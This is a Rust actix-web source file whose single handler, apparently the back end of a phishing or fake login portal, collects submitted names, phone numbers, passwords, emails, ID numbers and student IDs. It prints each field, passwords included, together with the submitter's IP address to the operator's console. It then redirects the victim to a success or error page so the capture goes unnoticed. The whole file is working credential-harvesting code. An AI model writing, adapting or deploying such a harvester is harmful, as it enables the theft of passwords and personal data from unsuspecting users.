use actix_web::{HttpRequest, HttpResponse, http::header, post, web};
use colored::Colorize;
use serde::Deserialize;

use crate::Conf;

#[derive(Debug, Deserialize)]
struct InfoForm {
    #[serde(default)]
    name: String,
    #[serde(default)]
    phone: i64,
    #[serde(default)]
    password: String,
    #[serde(default)]
    email: String,
    #[serde(default)]
    id: String,
    #[serde(default)]
    student_id: String,
    #[serde(default)]
    agree: String,
}

#[post("/api/auth")]
pub async fn submit(
    req: HttpRequest,
    form: web::Form<InfoForm>,
    conf: web::Data<Conf>,
) -> HttpResponse {
    if let Some(addr) = req.peer_addr() {
        println!(
            "{}{}",
            "[!] New submission from ".bright_blue(),
            addr.to_string().bright_red().bold()
        );
    } else {
        println!("{}", "[!] New submission".bright_blue());
        println!("{}", "Warn: unable to get client addr".bright_red())
    }
    print!(
        "\t{}: {}\n\t{}: {}\n\t{}: {}\n\t{}: {}\n\t{}: {}\n\t{}: {}\n\t{}: {}\n",
        "Name".bright_red().bold(),
        form.name,
        "Phone".bright_red().bold(),
        form.phone,
        "Password".bright_red().bold(),
        form.password,
        "ID".bright_red().bold(),
        form.id,
        "Email".bright_red().bold(),
        form.email,
        "Student ID".bright_red().bold(),
        form.student_id,
        "Agree".red(),
        form.agree,
    );
    if !conf.offline {
        // allow user to access success page
        return HttpResponse::Found()
            .insert_header((header::LOCATION, "success/success.html"))
            .finish();
    }
    HttpResponse::Found()
        .insert_header((header::LOCATION, "/login/err.html"))
        .finish()
}
